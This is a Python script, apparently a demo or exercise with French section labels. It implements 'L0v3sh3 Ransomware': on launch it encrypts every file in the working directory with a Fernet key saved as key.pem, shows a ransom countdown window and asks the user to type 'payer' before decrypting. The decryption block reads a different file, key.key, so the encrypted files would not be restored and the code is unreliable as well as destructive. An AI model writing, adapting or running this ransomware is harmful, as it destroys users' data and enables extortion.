import os, sys
from cryptography.fernet import Fernet
import tkinter as tk


# If not input is given, then set current directory as the root
# directory from where you need to encrypt all the files.
"""""-----------------------------------------------------chiffré-----------------------------------------------------------"""

import os, sys
from cryptography.fernet import Fernet

# If not input is given, then set current directory as the root
# directory from where you need to encrypt all the files.


all_files = []

for file in os.listdir(): 
    if file =="ransomware-Ubuntu.py" or file == "key.pem":
        continue
    else :
        all_files.append(file)


key = Fernet.generate_key()



# Save the key for now so that we can also decrypt all the encrypted
# files using the same key.

# Open file in 'wb' so that we can write binary to it.
with open("key.pem", "wb") as keyfile:
    keyfile.write(key)

for file in all_files:
    with open(file, "rb") as raw_file:
        contents = raw_file.read()
    enc_contents = Fernet(key).encrypt(contents)
    with open(file, "wb") as raw_file:
        raw_file.write(enc_contents)
        
print("Files that have been encrypted are:")
for names in all_files:
    print("{}".format(names))

"""-----------------------------------------------------message---------------------------------------------------------------------------------------"""

def countdown(count):
# change text in label
# count = '01:30:00'
    hour, minute, second = count.split(':')
    hour = int(hour)
    minute = int(minute)
    second = int(second)
    label['text'] = '{}:{}:{}'.format(hour, minute, second)
    if second > 0 or minute > 0 or hour > 0:
    # call countdown again after 1000ms (1s)
        if second > 0:
            second -= 1
        elif minute > 0:
            minute -= 1
            second = 59
        elif hour > 0:
            hour -= 1
            minute = 59
            second = 59
    
        root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second))
root = tk.Tk()
root.title('L0v3sh3 Ransomware')
root.geometry('500x300')
root.resizable(False, False)
label1 = tk.Label(root, text='Your data is under rest, please don\'t pay me,\nthis just simulation !!\n\n', font=('calibri', 12,'bold'))
label1.pack()
label = tk.Label(root,font=('calibri', 50,'bold'), fg='white', bg='blue')
label.pack()
# call countdown first time
countdown('00:00:10')
# root.after(0, countdown, 5)
root.mainloop()
###################################il faut payer###########################################
msg = input("Payer le rançon :")
"""----------------------------------------------------Déchiffré---------------------------------------------------------------------------------------"""

import os, sys
from cryptography.fernet import Fernet

# If not input is given, then set current directory as the root
# directory from where you need to encrypt all the files.

all_files = []

for file in os.listdir(): 
    if file =="ransomware-Ubuntu.py" or file == "key.pem":
        continue
    else :
        all_files.append(file)

if msg =='payer' :

    # Save the key for now so that we can also decrypt all the encrypted
    # files using the same key.

    # Open file in 'wb' so that we can write binary to it.
    with open("key.key", "rb") as thekey:
        code = thekey.read()

    for file in all_files:
        try:
            with open(file, "rb") as enc_file:
                contents = enc_file.read()
            raw_contents = Fernet(code).decrypt(contents)
            with open(file, "wb") as enc_file:
                enc_file.write(raw_contents)
        except:
            print("{} not decrypted".format(file))
            pass

    print("Files that have been decrypted are:")
    for names in all_files:
        print("{}".format(names))

"""---------------------------------------------------------------------Fin----------------------------------------------------------------------------------"""
